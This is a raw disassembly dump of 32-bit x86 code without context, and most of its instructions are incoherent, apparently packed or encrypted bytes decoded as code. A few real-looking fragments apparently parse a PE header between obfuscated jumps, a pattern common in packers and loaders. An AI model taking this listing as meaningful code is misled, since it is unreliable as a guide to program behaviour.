  40ff28:	mov    BYTE PTR [ebx+0x1c6a8985],0xb7
  40ff2f:	jnp    0x40feb8
  40ff31:	sbb    dh,BYTE PTR gs:[ecx-0x51622142]
  40ff38:	fiadd  WORD PTR [esi-0x46dafce5]
  40ff3e:	add    ecx,DWORD PTR ds:[eax-0x5b]
  40ff42:	mov    esp,0x8b6283b6
  40ff47:	push   esi
  40ff48:	jmp    0x34b0:0xb8ce6605
  40ff4f:	and    ah,BYTE PTR [eax]
  40ff51:	daa    
  40ff52:	add    BYTE PTR gs:[edx-0x4ce0e841],bl
  40ff59:	int3   
  40ff5a:	outs   dx,DWORD PTR ds:[esi]
  40ff5b:	jmp    0x4f7c:0xf0cd6ba5
  40ff62:	scas   eax,DWORD PTR es:[edi]
  40ff63:	jecxz  0x40ffd3
  40ff65:	test   eax,0x75f2ae82
  40ff6a:	jno    0x40ff33
  40ff6c:	inc    ebp
  40ff6d:	cld    
  40ff6e:	xor    DWORD PTR [ebp+0x458bf89c],eax
  40ff74:	or     BYTE PTR [edx+0x3405c700],cl
  40ff7a:	loop   0x40ffbe
  40ff7c:	add    BYTE PTR [edx],bh
  40ff7e:	cmp    al,BYTE PTR [eax]
  40ff80:	add    BYTE PTR [edi+esi*1],al
  40ff83:	xor    DWORD PTR ds:0x42e7f7,0x42fe7e
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fdd1,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fe76
  40ffaa:	and    edx,DWORD PTR ds:0x42e7fb
  40ffb0:	mov    DWORD PTR ds:0x42fe76,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e803,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	dec    esi
  40ffdd:	call   DWORD PTR [edi]
  40ffdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffe0:	xor    eax,0xa37070bd
  40ffe5:	jge    0x410057
  40ffe7:	jo     0x41001d
  40ffe9:	jb     0x40ff85
  40ffeb:	push   eax
  40ffec:	xor    eax,0x46d8a4b9
  40fff1:	dec    eax
  40fff2:	jge    0x410073
  40fff4:	adc    esi,edx
  40fff6:	(bad)  
  40fff7:	ror    DWORD PTR [ebp+esi*1-0x6ad4f475],0xbf
  40ffff:	mov    bl,0xe0
  410001:	sub    al,cl
  410003:	pop    ebx
  410004:	xor    DWORD PTR [ecx+0x31],esp
  410007:	mov    DWORD PTR [ebx+eax*1-0x156643ef],edi
  41000e:	or     al,BYTE PTR fs:[ecx+esi*4]
  410012:	es mov dh,0x2e
  410015:	nop
  410016:	int3   
  410017:	rol    DWORD PTR [esi],1
  410019:	lahf   
  41001a:	fadd   QWORD PTR [ebp-0x4bfd9dd7]
  410020:	out    0x36,al
  410022:	and    BYTE PTR [ecx-0x2554567c],dh
  410028:	push   cs
  410029:	dec    dx
  41002b:	xor    bl,BYTE PTR [edx]
  41002d:	outs   dx,BYTE PTR ds:[esi]
  41002e:	(bad)
  410032:	shl    BYTE PTR [ebx],0x1c
  410035:	ds aaa 
  410037:	cli    
  410038:	lods   al,BYTE PTR ds:[esi]
  410039:	inc    eax
  41003a:	imul   eax,DWORD PTR [eiz*8+0x2940df1c],0xbce4a7e4
  410045:	push   edi
  410046:	neg    BYTE PTR [ebp+0x5ab23668]
  41004c:	aam    0xf0
  41004e:	inc    edi
  41004f:	push   cs
  410050:	mov    WORD PTR [esi+0x1edfad6a],es
  410056:	ds xchg ebx,eax
  410058:	adc    al,0xb2
  41005a:	test   al,0x23
  41005c:	das    
  41005d:	(bad)  
  41005e:	repz ja 0x410023
  410061:	push   cs
  410062:	push   esi
  410063:	int    0x4
  410065:	lods   eax,DWORD PTR ds:[esi]
  410066:	mov    esp,0xc5611c29
  41006b:	lods   eax,DWORD PTR ds:[esi]
  41006c:	popf   
  41006d:	mov    ecx,0xd2d5cd2a
  410072:	inc    ebx
  410073:	arpl   WORD PTR [edi+eax*1-0x40803013],dx
  41007a:	repnz xchg esi,eax
  41007c:	and    dl,bl
  41007e:	pusha  
  41007f:	ds inc edi
  410081:	idiv   BYTE PTR [edx]
  410083:	(bad)
  410087:	mov    edi,0x89bf6edd
  41008c:	xchg   BYTE PTR [edx],dh
  41008e:	cmp    al,0x39
  410090:	xchg   edi,eax
  410091:	popf   
  410092:	cmp    DWORD PTR [edx],ebx
  410094:	cwde   
  410095:	je     0x41007c
  410097:	fadd   st,st(4)
  410099:	mov    esp,0xf5a381a2
  41009e:	jp     0x410105
  4100a0:	aaa    
  4100a1:	xchg   ebp,eax
  4100a2:	daa    
  4100a3:	popf   
  4100a4:	jae    0x410042
  4100a6:	and    cl,bh
  4100a8:	ins    DWORD PTR es:[edi],dx
  4100a9:	retf   0xcf9e
  4100ac:	jecxz  0x41003e
  4100ae:	jecxz  0x41011a
  4100b0:	cmp    edx,DWORD PTR [eax+edx*1-0x3d754aa3]
  4100b7:	mov    ecx,0x12a48325
  4100bc:	jne    0x4100d8
  4100be:	mov    WORD PTR [esi+ebx*4-0x57f46311],es
  4100c5:	pop    ds
  4100c6:	mov    ds:0x3ee8073e,al
  4100cb:	sub    ch,BYTE PTR [edi+edi*1]
  4100ce:	mov    BYTE PTR [edi],ch
  4100d0:	aam    0x98
  4100d2:	push   edx
  4100d3:	dec    ecx
  4100d4:	mov    ds:0x143fa634,eax
  4100d9:	xchg   edx,eax
  4100da:	add    bh,BYTE PTR ds:0xd8f91f38
  4100e0:	pop    eax
  4100e1:	and    BYTE PTR [ebx-0x15],0xa
  4100e5:	jp     0x4100a7
  4100e7:	mov    ds:0xc7e1a570,al
  4100ec:	mov    esp,0x4e18777e
  4100f1:	lods   eax,DWORD PTR ds:[esi]
  4100f2:	pop    ss
  4100f3:	fstp   QWORD PTR [esi]
  4100f5:	test   al,0x3f
  4100f7:	popf   
  4100f8:	push   esp
  4100f9:	nop
  4100fa:	(bad)  
  4100fb:	mov    eax,0x880cc633
  410100:	(bad)  
  410101:	rol    DWORD PTR [edi],cl
  410103:	in     eax,0x23
  410105:	(bad)  
  410106:	cld    
  410107:	inc    esi
  410108:	or     DWORD PTR ds:0x737fb471,ebp
  41010e:	ffree  st(7)
  410110:	fmul   QWORD PTR [eax+0x6e]
  410113:	mov    ecx,0x4dcf03a6
  410118:	mov    BYTE PTR [ebp+ecx*2-0x201b1915],0xe6
  410120:	int3   
  410121:	icebp  
  410122:	dec    edi
  410123:	cs loope 0x41014d
  410126:	jp     0x4101a6
  410128:	mov    al,ah
  41012a:	data16 jge 0x4100d7
  41012d:	retf   0x34d3
  410130:	jmp    0xf54:0x2eff8f92
  410137:	mov    edx,DWORD PTR [ebx-0xf083922]
  41013d:	retf   
  41013e:	jb     0x41010f
  410140:	dec    esp
  410141:	xor    dl,BYTE PTR [esi]
  410143:	fst    DWORD PTR [edi+0x4f2e86a9]
  410149:	dec    edx
  41014a:	fcomip st,st(6)
  41014c:	out    0xd,eax
  41014e:	das    
  41014f:	ins    DWORD PTR es:[edi],dx
  410150:	das    
  410151:	cli    
  410152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410153:	pop    es
  410154:	cmp    eax,0x390c818f
  410159:	ins    BYTE PTR es:[edi],dx
  41015a:	cs mov al,0x79
  41015d:	rcr    bh,1
  41015f:	jns    0x41017d
  410161:	bswap  esp
  410163:	sar    DWORD PTR [ebx+0x36],1
  410166:	call   FWORD PTR [ecx]
  410168:	stc    
  410169:	sub    eax,0x80f67800
  41016e:	es jo  0x410128
  410171:	xchg   ebp,eax
  410172:	xchg   edx,eax
  410173:	shr    BYTE PTR [edi-0x5d512b87],0x7e
  41017a:	scas   eax,DWORD PTR es:[edi]
  41017b:	cwde   
  41017c:	test   eax,0xe397fd02
  410181:	fld    QWORD PTR [edi+0x7e]
  410184:	sbb    esi,DWORD PTR [ecx+ebx*4]
  410187:	xchg   ecx,eax
  410188:	or     al,0xac
  41018a:	scas   al,BYTE PTR es:[edi]
  41018b:	call   0x2879de64
  410190:	shr    DWORD PTR [ebx+0x71],0x6
  410194:	xchg   ecx,eax
  410195:	fcmovnbe st,st(1)
  410197:	push   ecx
  410198:	dec    ecx
  410199:	sbb    esi,DWORD PTR [ebx+0x133a5534]
  41019f:	cs jl  0x410218
  4101a2:	xor    DWORD PTR ds:0x386ac4a9,ecx
  4101a8:	jmp    0xd012990e
  4101ad:	xchg   edi,eax
  4101ae:	scas   eax,DWORD PTR es:[edi]
  4101af:	pop    edx
  4101b0:	jecxz  0x410163
  4101b2:	xor    DWORD PTR [ebp+0xaac741e],edx
  4101b8:	in     eax,0x16
  4101ba:	sbb    eax,esp
  4101bc:	mov    BYTE PTR [ecx],cl
  4101be:	bound  edx,QWORD PTR [edx-0x17]
  4101c1:	(bad)  
  4101c2:	sub    BYTE PTR [ecx-0x2388dc9c],dl
  4101c8:	pmullw mm3,QWORD PTR [edx-0x67b9d319]
  4101cf:	adc    eax,DWORD PTR [ecx+0x4388dc74]
  4101d5:	dec    edx
  4101d6:	mov    ds:0x8916d32b,eax
  4101db:	jge    0x4101b9
  4101dd:	adc    esp,ebx
  4101df:	into   
  4101e0:	out    dx,al
  4101e1:	inc    dh
  4101e3:	gs and eax,esi
  4101e6:	out    0x94,al
  4101e8:	(bad)  
  4101e9:	jo     0x41016e
  4101eb:	cmc    
  4101ec:	cmp    edi,DWORD PTR [eax]
  4101ee:	das    
  4101ef:	rol    BYTE PTR ds:0x34751ffe,cl
  4101f5:	inc    ebx
  4101f6:	mov    edx,0xa038bc04
  4101fb:	in     al,dx
  4101fc:	fst    DWORD PTR [eax]
  4101fe:	cwde   
  4101ff:	xchg   esp,eax
  410200:	sub    eax,0x95e6a53b
  410205:	mov    dl,0x19
  410207:	adc    eax,0x92af4478
  41020c:	pop    eax
  41020d:	fxch   st(2)
  41020f:	mov    ebp,0x8d1251f5
  410214:	pop    es
  410215:	dec    esp
  410216:	sbb    BYTE PTR [esp+ecx*4],dh
  410219:	pop    esp
  41021a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41021b:	jmp    0x41027a
  41021d:	fisttp QWORD PTR [ebx+0x30eba2a5]
  410223:	leave  
  410224:	loope  0x410278
  410226:	or     edx,DWORD PTR [eax]
  410228:	retf   
  410229:	arpl   ax,ax
  41022b:	repz add eax,0x6604c255
  410231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410232:	fidivr DWORD PTR [ebx+edi*2-0x6d]
  410236:	push   ecx
  410237:	shl    DWORD PTR [ebp-0x64],0xd4
  41023b:	not    edi
  41023d:	cmp    al,0x50
  41023f:	inc    ecx
  410240:	sub    BYTE PTR [edx+0x67],0x68
  410244:	adc    BYTE PTR [esi],ch
  410246:	dec    edx
  410247:	push   ebp
  410248:	dec    edi
  410249:	retf   0x1aeb
  41024c:	repnz mov edx,0x31e35d08
  410252:	fadd   QWORD PTR [eax+0x5c01db57]
  410258:	scas   al,BYTE PTR es:[edi]
  410259:	je     0x41027c
  41025b:	inc    ecx
  41025c:	dec    eax
  41025d:	xchg   esi,eax
  41025e:	push   ebp
  41025f:	push   0x206e79ac
  410264:	push   ss
  410265:	mov    ch,0x2e
  410267:	pushf  
  410268:	bound  ecx,QWORD PTR [ecx+eax*4-0x1c056027]
  41026f:	aad    0xaa
  410271:	js     0x41029f
  410273:	jnp    0x41020c
  410275:	push   ebx
  410276:	bnd call 0x3329491a
  41027c:	fnstenv [ebx-0x77]
  41027f:	mov    DWORD PTR [edi-0x8bb3884],ebx
  410285:	cmp    eax,0xc4fa54cc
  41028a:	xor    DWORD PTR [edx+0x2c],ebp
  41028d:	adc    cl,ch
  41028f:	mov    esp,0x62576c
  410294:	jp     0x41028e
  410296:	or     BYTE PTR es:[edx+0x63f6aca5],bh
  41029d:	inc    edx
  41029e:	rcl    dh,1
  4102a0:	mov    ah,0xc9
  4102a2:	pop    edx
  4102a3:	std    
  4102a4:	mov    dh,dh
  4102a6:	fstp   TBYTE PTR [edx+0x65de3ae4]
  4102ac:	call   0x9f2e6b75
  4102b1:	test   eax,0x18a6f63f
  4102b6:	fdivr  st(4),st
  4102b8:	push   eax
  4102b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102ba:	repnz push edx
  4102bc:	jae    0x4102aa
  4102be:	popf   
  4102bf:	adc    esp,DWORD PTR [edi+ecx*1+0x3]
  4102c3:	hlt    
  4102c4:	mov    fs,esp
  4102c6:	sbb    al,0xc
  4102c8:	popf   
  4102c9:	retf   
  4102ca:	xchg   ebp,eax
  4102cb:	fldenv [bp+0x676c]
  4102d0:	mov    eax,ds:0xf885c45a
  4102d5:	sahf   
  4102d6:	rol    DWORD PTR [edi],1
  4102d8:	aam    0xa6
  4102da:	rcr    al,1
  4102dc:	fisttp QWORD PTR [ebp-0x1ec0cfb]
  4102e2:	ret    
  4102e3:	and    BYTE PTR [eax],ah
  4102e5:	push   es
  4102e6:	xor    al,0xca
  4102e8:	clc    
  4102e9:	cwde   
  4102ea:	ins    DWORD PTR es:[edi],dx
  4102eb:	push   ds
  4102ec:	sub    DWORD PTR [ebx],edi
  4102ee:	stos   BYTE PTR es:[edi],al
  4102ef:	push   ecx
  4102f0:	pop    eax
  4102f1:	mov    dh,0x93
  4102f3:	add    bh,ch
  4102f5:	mov    edi,0x55bf148e
  4102fa:	shl    BYTE PTR [ecx+eiz*1-0x3c1744d1],1
  410301:	adc    edi,DWORD PTR cs:[edx+0x1e]
  410305:	(bad)  
  410306:	dec    esp
  410307:	lods   eax,DWORD PTR ds:[esi]
  410308:	push   eax
  410309:	cdq    
  41030a:	repnz fdivr st(2),st
  41030d:	jmp    0x7dcb:0xb40ddab
  410314:	data16 xor al,0xd4
  410317:	call   FWORD PTR [ecx+edi*8+0x386467ef]
  41031e:	xchg   esi,eax
  41031f:	push   eax
  410320:	cs test eax,0x6855d9fe
  410326:	cdq    
  410327:	(bad)  
  410328:	sbb    BYTE PTR [ecx+0x1b],bh
  41032b:	test   DWORD PTR [ebp+ebp*4-0x759ddbc6],edi
  410332:	xchg   BYTE PTR [eax+edi*1-0x6a],dl
  410336:	push   ebx
  410337:	xchg   ebp,eax
  410338:	div    BYTE PTR ds:0xe266a41e
  41033e:	cmp    esi,DWORD PTR [eax+ebx*2-0x12cf5cdc]
  410345:	fld    st(5)
  410347:	jmp    0xd875:0x680d37b1
  41034e:	ins    BYTE PTR es:[edi],dx
  41034f:	repnz mov ds:0xf9865631,eax
  410355:	add    ebx,DWORD PTR [ebx-0x25]
  410358:	jle    0x41037e
  41035a:	jp     0x41034e
  41035c:	pop    ds
  41035d:	ds dec ebp
  41035f:	inc    ebx
  410360:	lods   eax,DWORD PTR ds:[esi]
  410361:	fidiv  DWORD PTR [ebx-0x13]
  410364:	pop    es
  410365:	popf   
  410366:	popf   
  410367:	lds    esi,FWORD PTR [eax]
  410369:	xor    DWORD PTR [esi-0x7a6f607b],0xffffffa2
  410370:	adc    DWORD PTR [esi+0x55],esi
  410373:	xor    eax,DWORD PTR [ecx-0x3daf6db6]
  410379:	cmc    
  41037a:	test   bl,dl
  41037c:	je     0x4103bb
  41037e:	mov    ah,0xa5
  410380:	sbb    DWORD PTR [edi-0x6fb03f3c],ebx
  410386:	xor    al,0xdf
  410388:	clc    
  410389:	dec    ecx
  41038a:	mov    esi,0x7e9ccc18
  41038f:	scas   al,BYTE PTR es:[edi]
  410390:	pop    esi
  410391:	daa    
  410392:	push   0x4d8932c4
  410397:	or     BYTE PTR ds:0x2082,al
  41039d:	mov    eax,DWORD PTR [ebp-0x4]
  4103a0:	mov    ecx,DWORD PTR ds:0x42fe05
  4103a6:	add    ecx,DWORD PTR ds:0x42fe09
  4103ac:	mov    DWORD PTR ds:0x42fe05,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e21c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0xba70:0x966bbab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	mov    edi,es
  4103dc:	outs   dx,BYTE PTR ds:[esi]
  4103dd:	cmp    esp,edi
  4103df:	sub    BYTE PTR [ecx-0xe0cc99c],bh
  4103e5:	push   edx
  4103e6:	xor    BYTE PTR [ecx+0x51],0x79
  4103ea:	je     0x410437
  4103ec:	sub    al,0x76
  4103ee:	xor    DWORD PTR [ecx-0x4d],ebp
  4103f1:	out    0x26,eax
  4103f3:	out    dx,al
  4103f4:	nop
  4103f5:	mov    al,0x83
  4103f7:	cmp    ebx,edx
  4103f9:	mov    eax,0xdc527626
  4103fe:	icebp  
  4103ff:	mov    edi,0xabd58d4a
  410404:	push   ss
  410405:	add    ah,cl
  410407:	inc    ebp
  410408:	fs add eax,0x1f3a342
  41040e:	popaw  
  410410:	cli    
  410411:	out    0xe9,eax
  410413:	(bad)
  410416:	mov    ds:0xa8652cf7,eax
  41041b:	push   0x1d968486
  410420:	add    al,0x61
  410422:	add    ebp,edi
  410424:	push   ss
  410425:	xlat   BYTE PTR ds:[ebx]
  410426:	mov    esp,0xed465b6e
  41042b:	push   ds
  41042c:	inc    DWORD PTR [ebx-0x47]
  41042f:	mov    al,0xb8
  410431:	mov    DWORD PTR [edx-0x783cfcf7],ebx
  410437:	loop   0x4103ce
  410439:	call   0xd85191f7
  41043e:	or     bh,bh
  410440:	or     eax,0xb44ac01
  410445:	dec    ecx
  410446:	(bad)  
  410447:	lods   eax,DWORD PTR ds:[esi]
  410448:	cs inc ebx
  41044a:	rcl    BYTE PTR [ebx+0x50],1
  41044d:	or     esi,DWORD PTR ds:0x924b942a
  410453:	dec    esp
  410454:	inc    esi
  410455:	sbb    al,0x9e
  410457:	inc    ebp
  410458:	pop    ss
  410459:	or     bl,BYTE PTR [esi-0x2a730805]
  41045f:	xchg   edi,eax
  410460:	nop
  410461:	jmp    0x41041c
  410463:	loop   0x41048c
  410465:	add    BYTE PTR [ecx+0x6d3b5e4a],0xf0
  41046c:	push   es
  41046d:	ja     0x410413
  41046f:	psubw  mm7,QWORD PTR [ebx]
  410472:	xor    ch,BYTE PTR [ecx+0x2e]
  410475:	xchg   esi,eax
  410476:	and    eax,0x65cf09bd
  41047b:	pop    esi
  41047c:	jae    0x4104ea
  41047e:	daa    
  41047f:	dec    ebp
  410480:	cmp    BYTE PTR [esi+0x79],ch
  410483:	nop
  410484:	push   esp
  410485:	cwde   
  410486:	(bad)
  41048a:	adc    DWORD PTR [ebx-0x6c5c026f],eax
  410490:	aam    0x48
  410492:	shl    bl,0x2a
  410495:	jg     0x410421
  410497:	jp     0x41049e
  410499:	xor    bh,BYTE PTR [edx+0x3b41c0cb]
  41049f:	pop    ds
  4104a0:	dec    ecx
  4104a1:	sbb    al,0xb7
  4104a3:	sahf   
  4104a4:	cmp    al,BYTE PTR [ebx+0x7c4556a4]
  4104aa:	jno    0x4104b8
  4104ac:	jl     0x4104be
  4104ae:	add    dh,cl
  4104b0:	pop    ebp
  4104b1:	test   DWORD PTR [ecx+0x7da05694],edi
  4104b7:	or     edx,DWORD PTR [edx+edx*4-0x3d]
  4104bb:	call   0x295faa5b
  4104c0:	clc    
  4104c1:	mov    ebp,edx
  4104c3:	mov    eax,ds:0xab450f21
  4104c8:	sub    DWORD PTR [edx+0x60727a59],eax
  4104ce:	and    al,0xcd
  4104d0:	loop   0x4104cf
  4104d2:	push   0xffffffd1
  4104d4:	cmp    BYTE PTR [eax+esi*8-0xffa065e],dl
  4104db:	xor    BYTE PTR [ebx],al
  4104dd:	xchg   DWORD PTR [ebx-0xa7bf963],ebp
  4104e3:	dec    ecx
  4104e4:	xchg   ebp,eax
  4104e5:	push   ecx
  4104e6:	popf   
  4104e7:	test   al,dh
  4104e9:	and    BYTE PTR [ebx-0x31a4fa48],ch
  4104ef:	mov    esi,0x2b9f1bd3
  4104f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104f5:	daa    
  4104f6:	test   dl,dl
  4104f8:	jle    0x4104e5
  4104fa:	pushf  
  4104fb:	push   ebx
  4104fc:	inc    edi
  4104fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104fe:	jno    0x5d1abf0
  410504:	(bad)  
  410505:	call   0x1315ccbd
  41050a:	add    ebp,edi
  41050c:	nop
  41050d:	sbb    DWORD PTR [edi-0x49],0xffffffd2
  410511:	loopne 0x4104ac
  410513:	js     0x41051f
  410515:	fimul  DWORD PTR [ebx+0x35a08ef9]
  41051b:	xchg   DWORD PTR [ebx+ebx*1+0x10],ebp
  41051f:	and    edx,DWORD PTR [eax+0x61]
  410522:	xchg   esp,eax
  410523:	in     eax,0x2a
  410525:	lsl    edx,sp
  410528:	xchg   ebp,eax
  410529:	lahf   
  41052a:	call   0x5813:0xfd81ac5e
  410531:	daa    
  410532:	and    ebx,DWORD PTR [esi+0x5d4862b2]
  410538:	push   ds
  410539:	(bad)  
  41053a:	xchg   ebx,eax
  41053b:	out    0x93,eax
  41053d:	push   ebp
  41053e:	stc    
  41053f:	mov    al,0x42
  410541:	sbb    BYTE PTR [ebx],al
  410543:	mov    ah,0xfe
  410545:	cld    
  410546:	fwait
  410547:	dec    ebp
  410548:	cwde   
  410549:	xor    DWORD PTR [ecx],ebx
  41054b:	cdq    
  41054c:	(bad)  
  41054d:	std    
  41054e:	shr    BYTE PTR [ecx-0x3f],cl
  410551:	imul   eax,DWORD PTR [ebp-0x7ec01e63],0xf32320cf
  41055b:	push   0xf1d22768
  410560:	cdq    
  410561:	(bad)  
  410562:	sbb    eax,0x665a639e
  410567:	add    BYTE PTR [edi],ah
  410569:	cmp    al,0x9a
  41056b:	test   eax,0x1bf611f9
  410570:	cmc    
  410571:	shl    ch,0xfb
  410574:	xchg   edx,eax
  410575:	mov    ds:0x4f35d461,eax
  41057a:	push   eax
  41057b:	jp     0x410586
  41057d:	adc    eax,0x977a4ea7
  410582:	aaa    
  410583:	cmp    al,BYTE PTR [edi+esi*4]
  410586:	fiadd  DWORD PTR [ecx+0x7c]
  41058a:	pop    ds
  41058b:	fst    st(4)
  41058d:	cmp    bl,dl
  41058f:	stos   BYTE PTR es:[edi],al
  410590:	dec    edx
  410591:	xchg   eax,edi
  410593:	sbb    eax,DWORD PTR [ebp+0x490d72b9]
  410599:	rol    BYTE PTR [esi],cl
  41059b:	inc    ebp
  41059c:	mov    cl,0x3d
  41059e:	jl     0x4105ef
  4105a0:	addr16 dec ebx
  4105a2:	jmp    0x410543
  4105a4:	imul   edi,DWORD PTR [ebx],0xa75c115a
  4105aa:	push   cs
  4105ab:	stc    
  4105ac:	push   0xffffffea
  4105ae:	sub    ebx,edi
  4105b0:	mov    dh,0x11
  4105b2:	push   es
  4105b3:	xchg   ebx,eax
  4105b4:	mov    ch,0x4d
  4105b6:	es jmp 0x884e8403
  4105bc:	lock shl bl,0x6e
  4105c0:	jae    0x41063d
  4105c2:	jg     0x4105d7
  4105c4:	data16 sub ch,bl
  4105c7:	xlat   BYTE PTR ds:[ebx]
  4105c8:	push   edi
  4105c9:	shl    esi,1
  4105cb:	out    0xd,eax
  4105cd:	dec    eax
  4105ce:	mov    al,0x7
  4105d0:	jmp    FWORD PTR [eax+0xba184b8]
  4105d6:	mov    ebx,es
  4105d8:	jb     0x410583
  4105da:	xchg   edx,eax
  4105db:	pop    eax
  4105dc:	dec    esp
  4105dd:	mov    dh,BYTE PTR [eax]
  4105df:	mov    ds:0x32b682b9,al
  4105e4:	fimul  DWORD PTR [ecx*1-0x546db352]
  4105eb:	stc    
  4105ec:	xchg   ecx,eax
  4105ed:	sbb    ebx,DWORD PTR [esi+0x13babad3]
  4105f3:	jns    0x41062c
  4105f5:	cmp    BYTE PTR [ebx],ah
  4105f7:	clc    
  4105f8:	mov    ecx,0x2007070e
  4105fd:	cmp    eax,0x4ff8ada7
  410602:	call   0x5b0b160b
  410607:	sub    al,0xa0
  410609:	jmp    0x49d071da
  41060e:	imul   edi,DWORD PTR [esi-0x6fed86e0],0x21
  410615:	xchg   edx,eax
  410616:	mov    eax,ds:0x320f8bd
  41061b:	(bad)  
  41061c:	xor    ecx,esp
  41061e:	xchg   DWORD PTR [ecx],edx
  410620:	les    edi,FWORD PTR [ebx]
  410622:	pop    esp
  410623:	jno    0x4105c0
  410625:	xchg   ebp,eax
  410626:	cdq    
  410627:	aad    0x31
  410629:	data16 sar BYTE PTR ds:0x52161092,cl
  410630:	inc    ebp
  410631:	fs jl  0x410602
  410634:	inc    eax
  410635:	sahf   
  410636:	push   ebp
  410637:	inc    eax
  410638:	push   es
  410639:	xchg   esi,eax
  41063a:	xchg   BYTE PTR [edx+esi*2],bl
  41063d:	ficomp WORD PTR [edi]
  41063f:	lock mov gs,edx
  410642:	mov    al,ds:0xdb550502
  410647:	sahf   
  410648:	fistp  WORD PTR [ebp-0x4b]
  41064b:	push   0xffffffa3
  41064d:	sub    al,0xac
  41064f:	in     al,0x98
  410651:	(bad)  
  410652:	and    BYTE PTR [esi],bh
  410654:	pop    ebp
  410655:	stos   DWORD PTR es:[edi],eax
  410656:	mov    ebx,0xe94c3563
  41065b:	dec    edx
  41065c:	cwde   
  41065d:	mov    bh,0x69
  41065f:	int3   
  410660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410661:	mov    BYTE PTR [ebx+0x74],ch
  410664:	ret    
  410665:	call   0x8902e991
  41066a:	cmc    
  41066b:	jp     0x41069d
  41066d:	mov    al,ds:0xb994cb32
  410672:	pop    ebx
  410673:	jne    0x41064f
  410675:	xor    al,0xf8
  410677:	add    eax,0x627b78d9
  41067c:	mov    dh,0xe0
  41067e:	arpl   WORD PTR [ebp-0x795cc876],cx
  410684:	(bad)  
  410685:	jl     0x410654
  410687:	mov    ch,bh
  410689:	outs   dx,DWORD PTR ds:[esi]
  41068a:	and    al,0x6
  41068c:	das    
  41068d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41068e:	pop    ebp
  41068f:	inc    ebx
  410690:	fsubr  QWORD PTR [esi-0x24]
  410693:	mov    edi,0x6ae70eda
  410698:	mov    ecx,0x6a6423c1
  41069d:	adc    dh,BYTE PTR [edx-0x2b]
  4106a0:	nop
  4106a1:	push   ds
  4106a2:	jmp    0x4ab7:0x20ad2e25
  4106a9:	clc    
  4106aa:	jg     0x41063f
  4106ac:	cmc    
  4106ad:	adc    BYTE PTR [eax-0x461e44b3],0x37
  4106b4:	imul   esi,DWORD PTR [ebp-0x675b0fb1],0xffffffab
  4106bb:	fst    QWORD PTR [ecx+0x35c58d79]
  4106c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106c2:	fdiv   QWORD PTR [ecx+0x73]
  4106c5:	push   ecx
  4106c6:	or     al,0x7a
  4106c8:	repz ror ecx,1
  4106cb:	sbb    ecx,ecx
  4106cd:	mov    edx,0xe0b2c3d
  4106d2:	push   ebx
  4106d3:	xor    BYTE PTR [edi+ebp*8-0x40],al
  4106d7:	jg     0x41069d
  4106d9:	adc    al,0x8a
  4106db:	jb     0x410666
  4106dd:	pop    edi
  4106de:	ins    DWORD PTR es:[edi],dx
  4106df:	or     edi,DWORD PTR [ebx-0x7c0ba0de]
  4106e5:	ficomp WORD PTR [edi+ebx*2+0x31]
  4106e9:	cs dec ebx
  4106eb:	out    dx,eax
  4106ec:	scas   eax,DWORD PTR es:[edi]
  4106ed:	clc    
  4106ee:	add    eax,0xa67aa440
  4106f3:	ins    DWORD PTR es:[edi],dx
  4106f4:	and    bl,BYTE PTR [ebp-0x64f027a7]
  4106fa:	sub    BYTE PTR [eax*2+0x488a9324],ah
  410701:	leave  
  410702:	mov    eax,0x5b79a13
  410707:	pop    ds
  410708:	cli    
  410709:	ja     0x410705
  41070b:	loop   0x41075e
  41070d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41070e:	das    
  41070f:	mov    edx,esi
  410711:	inc    ecx
  410712:	xor    dl,bl
  410714:	cmp    al,0x84
  410716:	jo     0x41073b
  410718:	adc    DWORD PTR [ecx],esp
  41071a:	in     al,dx
  41071b:	out    dx,al
  41071c:	outs   dx,DWORD PTR ds:[esi]
  41071d:	cmp    DWORD PTR [ebx+edx*2-0x2f],edx
  410721:	cmp    al,0x8c
  410723:	ret    
  410724:	idiv   BYTE PTR [esi]
  410726:	add    al,0xd2
  410728:	adc    dh,BYTE PTR [ebp-0x7d]
  41072b:	jl     0x410786
  41072d:	add    ch,BYTE PTR [ecx-0x280340e1]
  410733:	cmp    al,0xa6
  410735:	xlat   BYTE PTR ds:[ebx]
  410736:	sbb    eax,0xdef0098d
  41073b:	jae    0x4107b2
  41073d:	test   eax,0xd1cbc9d1
  410742:	pop    ds
  410743:	into   
  410744:	xchg   edi,eax
  410745:	mov    ds:0xd71e3000,al
  41074a:	push   ebp
  41074b:	std    
  41074c:	(bad)
  410750:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  410752:	pop    esp
  410753:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410754:	call   0x311a54ec
  410759:	stos   BYTE PTR es:[edi],al
